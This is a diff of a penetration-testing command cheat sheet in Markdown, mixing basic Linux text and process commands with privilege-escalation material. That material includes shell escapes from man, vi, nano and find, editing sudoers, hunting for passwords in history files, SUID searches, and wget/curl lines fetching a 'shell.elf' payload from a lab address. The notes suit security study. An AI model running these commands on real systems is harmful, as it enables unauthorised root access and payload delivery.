@@ -1,319 +1,257 @@
-# Basic Commands
+# Commands
 
-## Searching
+## [GTFOBins](https://gtfobins.github.io/)
 
-apropos
+## <a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/' target="blank">Linux PriEscal</a>
 
-Search the list of man page descriptions for a possible match based on a keyword.
+## Manual page
 
-``` bash
-apropos website
-get-iab (1)          - Fetch the arp-scan IAB file from the IEEE website
-get-oui (1)          - Fetch the arp-scan OUI file from the IEEE website (on Debian and Debian based systems, data is fetched from ieee-data package)
-whatweb (1)          - Next generation Web scanner. Identify technologies used by websites.
-```
+=== "man"
 
-## Create files
+	Spawn shell
 
-``` bash
-mkdir module one
+	In Manual page, we can execute `!/bin/bash` to spawn a shell.
 
-mkdir "module one"
+	``` bash 
+	man <key search>
+	```
 
-mkdir -p module/{one,two,three}
-```
+	``` bash
+	man -k '^passwd$'
+	```
 
-## Control output
+## Terminal editor
 
-Piping
+=== "vi"
 
-``` bash
-sudo ss -antlp | grep sshd
-```
+	``` bash
+	vi -c ':!/bin/sh' /dev/null
+	```
 
-sed
+	``` bash
+	vi
+	:set shell=/bin/sh
+	:shell
+	```
 
-``` bash
-echo 'Hades' | sed 's/Hades/leecybersec.com/'
-```
+=== "nano"
 
-cut
+	``` bash
+	nano
+	^R^X
+	reset; sh 1>&0 2>&0
+	```
 
-``` bash
-echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "
+	``` bash
+	sudo nano /var/opt/../../etc/sudoers
+	```
 
-penetration
-```
-``` bash
-cut -d ":" -f 1 /etc/passwd
-root
-daemon
-bin
-```
+## Finding
 
-awk
+=== "finding files"
 
-``` bash
-cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
-```
+	``` bash
+	find / -name "<name>"
+	```
 
-uniq -c
+===	"history, bashrc, backup"
 
-``` bash
-cat list.txt | sort | uniq -c | sort -r
-```
+	``` bash
+	find / -name *history* 2>/dev/null
+	find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
+	```
 
-grep
+===	"Binaries That AutoElevate"
 
-``` bash
-ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
-grep -v "Nmap"
-```
+	``` bash
+	find / -perm -u=s -type f 2>/dev/null
+	```
 
-cutycapt
+=== "Spawn shell"
 
-``` bash
-cutycapt --url=$ip --out=$ip.png
-```
+	``` bash
+	find . -exec /bin/sh \;
+	```
+
+## Filter output 
+
+=== "sed"
+
+	``` bash
+	sed -ne '/hades/,$ p' | sed '/hades@/Q' | sed 's/.*hades //'
+	```
+
+=== "cut"
+
+	``` bash
+	echo "hacking, penetration testing and bug hunting"| cut -f 2 -d " "
+	```
+
+	``` bash
+	cut -d ":" -f 1 /etc/passwd
+	```
+
+=== "awk"
+
+	``` bash
+	cat /etc/passwd | awk -F ":" '{print $1, ":", $7}' | grep "sh"
+	```
+
+=== "uniq -c"
+
+	``` bash
+	cat list.txt | sort | uniq -c | sort -r
+	```
+
+=== "grep"
+
+	``` bash
+	ifconfig | grep eth0 -C 1 | grep inet | cut -f10 -d' '
+	```
+
+	``` bash
+	grep -v "Nmap"
+	```
+
+## Screenshot
+
+=== "cutycapt"
+
+	``` bash
+	cutycapt --url=$ip --out=$ip.png
+	```
 
 ## Redirect
 
-to a New File
+=== "to a New File"
 
-``` bash
-ls > list.txt
-```
+	``` bash
+	ls > list.txt
+	```
 
-``` bash
-cat list.txt
-Desktop
-Documents
-list.txt
-```
+	``` bash
+	cat list.txt
+	Desktop
+	Documents
+	list.txt
+	```
 
-to an Existing File
+=== "to an Existing File"
 
-``` bash
-echo "Add new" >> list.txt
-```
+	``` bash
+	echo "Add new" >> list.txt
+	```
 
-from a File
+=== "from a File"
 
-``` bash
-wc -m < list.txt
-```
+	``` bash
+	wc -m < list.txt
+	```
 
-STDERR
+=== "STDERR"
 
-``` bash
-find / -perm -u=s -type f 2>/dev/null
-```
+	``` bash
+	find / -perm -u=s -type f 2>/dev/null
+	```
 
 ## Processes
 
-### Background a process 
+=== "Background a process"
 
-``` bash
-┌──(Hades㉿192.168.11.130)-[0.8:10.9]~
-└─$ nmap -p- 127.0.0.1 &           
-[1] 1239
-                                                                                                                                                                            
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:49 EST
-```
+	``` bash
+	nmap -p- 127.0.0.1 &
+	```
 
-### Suspend the job
+=== "Suspend the job"
 
-``` bash
-┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
-└─$ nmap -p- 192.168.11.131 -Pn
+	``` bash
+	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
+	└─$ nmap -p- 192.168.11.131 -Pn
 
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:52 EST
-^Z
-zsh: suspended  nmap -p- 192.168.11.131 -Pn
-┌──(Hades㉿192.168.11.130)-[0.7:11.4]~
-└─$ bg
+	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+	Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 20:52 EST
+	^Z
+	zsh: suspended  nmap -p- 192.168.11.131 -Pn
+	┌──(Hades㉿192.168.11.130)-[0.7:11.4]~
+	└─$ bg
 
-[1]  + continued  nmap -p- 192.168.11.131 -Pn
-```
+	[1]  + continued  nmap -p- 192.168.11.131 -Pn
+	```
 
-### jobs and fg
+=== "jobs and fg"
 
-``` bash
-┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
-└─$ jobs
+	``` bash
+	┌──(Hades㉿192.168.11.130)-[0.7:11.1]~
+	└─$ jobs
 
-[1]  + running    nmap -p- 192.168.11.131 -Pn
-                                                                                                                                                                            
-┌──(Hades㉿192.168.11.130)-[0.8:11.4]~
-└─$ fg
+	[1]  + running    nmap -p- 192.168.11.131 -Pn
+	                                                                                                                                                                            
+	┌──(Hades㉿192.168.11.130)-[0.8:11.4]~
+	└─$ fg
 
-[1]  + running    nmap -p- 192.168.11.131 -Pn
-^C
-```
+	[1]  + running    nmap -p- 192.168.11.131 -Pn
+	^C
+	```
 
-### ps and kill
+=== "ps and kill"
 
-``` bash
-ps -ef
-UID          PID    PPID  C STIME TTY          TIME CMD
-root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
-root           2       0  0 20:39 ?        00:00:00 [kthreadd]
-<snip>
-kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
-kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
-kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
-kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
-```
+	``` bash
+	ps -ef
+	UID          PID    PPID  C STIME TTY          TIME CMD
+	root           1       0  0 20:39 ?        00:00:02 /sbin/init splash
+	<snip>
+	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
+	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
+	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
+	kali        1673    1202  0 20:59 pts/0    00:00:00 ps -ef
+	```
 
-``` bash
-ps -fC nmap
-UID          PID    PPID  C STIME TTY          TIME CMD
-kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
-kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
-kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
-```
+	``` bash
+	ps -fC nmap
+	UID          PID    PPID  C STIME TTY          TIME CMD
+	kali        1448    1202  0 20:56 pts/0    00:00:01 nmap -p- 192.168.11.131 -Pn
+	kali        1466    1202  0 20:56 pts/0    00:00:00 nmap -p- 192.168.11.132 -Pn
+	kali        1484    1202  0 20:57 pts/0    00:00:00 nmap -p- 192.168.11.133 -Pn
+	```
 
-``` bash
-kill 1466                                                                                                                                                           2 ⚙
-                                                                                                                                                                            
-[2]  + terminated  nmap -p- 192.168.11.132 -Pn
-```
+	``` bash
+	kill 1466                                                                                                                                                           2 ⚙
+	                                                                                                                                                                            
+	[2]  + terminated  nmap -p- 192.168.11.132 -Pn
+	```
 
 ## Monitoring
 
-``` bash
-udo tail -f /var/log/apache2/access.log
-192.168.11.130 - - [09/Mar/2021:21:12:03 -0500] "GET / HTTP/1.1" 200 10956 "-" "curl/7.74.0"
-192.168.11.130 - - [09/Mar/2021:21:12:05 -0500] "GET / HTTP/1.1" 200 10956 "-" "curl/7.74.0"
-...
-```
+=== "tail"
 
-``` bash
-watch -n 1 date
-```
+	``` bash
+	sudo tail -f /var/log/apache2/access.log
+	```
+
+=== "watch"
+
+	``` bash
+	watch -n 1 date
+	```
 
 ## Downloading
 
-wget
+=== "wget"
 
-``` bash
-wget -O /tmp/shell http://192.168.110.131/shell.elf
-```
+	``` bash
+	wget -O /tmp/shell http://192.168.110.131/shell.elf
+	
+	wget <uri> -P /path/to/
+	```
 
-curl
+=== "curl"
 
-``` bash
-curl -o /tmp/shell http://192.168.110.131/shell.elf
-```
+	``` bash
+	curl -o /tmp/shell http://192.168.110.131/shell.elf
+	```
 
-axel
+=== "axel"
 
-``` bash
-axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
-```
-
-## Commands to Shell
-
-[https://gtfobins.github.io/](https://gtfobins.github.io/)
-
-### vi
-
-``` bash
-vi -c ':!/bin/sh' /dev/null
-```
-
-``` bash
-vi
-:set shell=/bin/sh
-:shell
-```
-
-### nano
-
-``` bash
-nano
-^R^X
-reset; sh 1>&0 2>&0
-```
-
-``` bash
-sudo nano /var/opt/../../etc/sudoers
-```
-
-### man
-
-``` bash 
-man nikto
-```
-
-Spawn shell
-
-In Manual page, we can execute `!/bin/bash` to spawn a shell.
-
-``` bash
-NIKTO(1)
-
-NAME
-       <snip>
-           2 - Show cookies received
- Manual page nikto(1) line 1 (press h for help or q to quit)!/bin/bash
-```
-
-``` bash
-┌──(Hades㉿192.168.11.130)-[11.8:13.3]~
-└─$ man nikto
-┌──(kali㉿kali)-[~]
-└─$ 
-```
-
-Searching commands
-
-``` bash
-┌──(Hades㉿192.168.11.130)-[0.9:13.5]~
-└─$ man -k '^passwd$'
-passwd (1)           - change user password
-passwd (1ssl)        - compute password hashes
-passwd (5)           - the password file
-                                                                                                                                                                            
-┌──(Hades㉿192.168.11.130)-[0.9:13.6]~
-└─$ man -k passwd      
-chgpasswd (8)        - update group passwords in batch mode
-chpasswd (8)         - update passwords in batch mode
-<snip>
-update-passwd (8)    - safely update /etc/passwd, /etc/shadow and /etc/group
-vncpasswd (1)        - set passwords for VNC server
-```
-
-### find
-
-``` bash
-find / -name "<name>"
-```
-
-Check history, bashrc, backup
-
-``` bash
-find / -name *history* 2>/dev/null
-find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
-```
-
-Binaries That AutoElevate
-
-``` bash
-find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-
-find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-
-# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-```
-
-Spawn shell
-
-``` bash
-find . -exec /bin/sh \;
-```
+	``` bash
+	axel -a -n 20 -o /tmp/shell http://192.168.110.131/shell.elf
+	```
